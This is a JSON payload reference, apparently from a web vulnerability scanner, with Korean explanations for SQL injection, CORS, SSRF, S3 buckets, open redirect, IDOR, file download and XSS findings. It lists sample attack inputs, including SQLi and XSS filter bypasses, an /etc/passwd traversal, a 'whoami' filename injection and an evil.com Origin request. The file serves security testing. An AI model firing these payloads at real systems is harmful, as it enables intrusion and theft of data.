{
    "SQLI" : {
        "description" : "SQLI 공격이 가능한 파라미터를 탐지 했습니다.<br>추가적인 분석이 필요합니다.",
        "payload" : [
            "1 or 1=1",
            " or select(sleep(3))",
            ",(select(sleep(3))",
            "union values row(1,2)"
        ],
        "reference" : [
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
        ]
    },
    "CORS" : {
        "description" : "Response Header에 CORS 관련 Header가 탐지 되었습니다.<br>Request Header에 Origin Header를 추가하여 공격 여부를 확인해야 합니다.",
        "payload" : [
            "GET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: https://evil.com\nCookie: sessionid=... "
        ],
        "reference" : [
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration"
        ]
    },
    "SSRF" : {
        "description" : "Request 패킷에 URL 주소 값이 탐지 되었습니다.<br>해당 값을 내부 IP 주소로 변경하여 SSRF 공격 가능 여부를 확인해야 합니다.",
        "payload" : [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://[::]:80/",
            "http://127.127.127.127",
            "http://2130706433/",
            "http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ",
            "Using gopher://"
        ],
        "reference" : [
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
        ]
    },
    "S3 Bucket" : {
        "description" : "S3 Bucket 주소가 탐지 되었습니다.<br>해당 S3 Bucket 주소가 Open 되어 있는지, 추가로 Public 권한인지를 확인해야 합니다.",
        "payload" : [
            "http://example.com/resources/id%C0 (Bucket 이름 획득, https://twitter.com/phxxe/status/1065581916437585920)"
            
        ],
        "reference" : [
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3"
        ]
    },
    "Open Redirect" : {
        "description" : "Request 패킷에 존재하는 파라미터 값으로 페이지가 이동 되었습니다.",
        "payload" : [
            "java%0d%0ascript%0d%0a:alert(0)",
            "//google.com (// 를 통해 http 문자열 필터링 bypass)",
            "////google.com (//// 를 통해 http 문자열 필터링 bypass)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg== (data wrapper 를 통한 XSS)"
        ],
        "reference" : [
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
        ]
    },
    "IDOR (not req)" : {
        "description" : "Request 파라미터 값 변조를 통해 IDOR 공격 가능성이 존재합니다.<br>Request path 변조로 간단한 테스트를 해보세요.",
        "payload" : [
            "/changepassword?user=someuser",
            "/somepage?invoice=12345"
        ],
        "reference" : [
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References"
        ]
    },
    "IDOR" : {
        "description" : "Request 패킷 전송을 통해 IDOR 취약점이 존재하는 것을 확인 했습니다.<br>Request path 변조로 간단한 테스트를 해보세요.",
        "payload" : [
            "/changepassword?user=someuser",
            "/somepage?invoice=12345"
        ],
        "reference" : [
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References"
        ]
    },
    "File Download" : {
        "description" : "파일 다운로드가 탐지 되었습니다. Request 패킷을 변조하여 File Download Vulnerability 를 확인해야 합니다.",
        "payload" : [
            "../../../../../../etc/passwd",
            "a`whoami`z.png (파일 이름 변조 뒤, 다운로드 했을 때 확인)",
            "a';select+sleep(10);--z.png (파일 이름 변조 뒤, 다운로드 했을 때 확인)",
            "filename=https://172.17.0.1/internal/file"
        ],
        "reference" : [
            "https://www.hahwul.com/2016/06/02/web-hacking-reflected-file-downloadrfd/"
        ]
    },
    "Reflect XSS" : {
        "description" : "GET 방식으로 전송된 파라미터 값이 input 태그의 값으로 출력되었습니다.<br>target 서버에 addslash 기능이 있더라도, html에서는 백슬래시(\\)로 더블쿼터(\")를 escape하지 않습니다.<br>따라서, 더블쿼터(\")를 넣어 tag escape를 통해 Reflected XSS 공격을 수행할 수 있습니다.",
        "payload" : [
            "\" onclick=a=alert;a(1); / ",
            "\"><details open ontoggle=confirm`1`>",
            "\"><svg onload=alert(1)>",
            "<uu src=@'@' onbigclick=import('//0a\"&nbsp;\"0a0a?0a/')>mou%09se<|/uu>:}",
            "\"><svg%20onload=alert%26%230000000040\"1\")>",
            "test\",prompt%0A/*HelloWorld*/(document.domain)"
        ],
        "reference" : [
            "https://github.com/hahwul/dalfox",
            "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
            "https://github.com/payloadbox/xss-payload-list"
        ]
    },
    "DOM XSS" : {
        "description" : "Response 패킷에 eval() 함수가 존재합니다. 이를 통해 Dom XSS 공격이 가능한지 확인해야 합니다.",
        "payload" : [
            
        ],
        "reference" : [
            "https://github.com/hahwul/dalfox",
            "https://portswigger.net/web-security/cross-site-scripting/dom-based",
            "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
            "https://github.com/payloadbox/xss-payload-list"
        ]
    }
}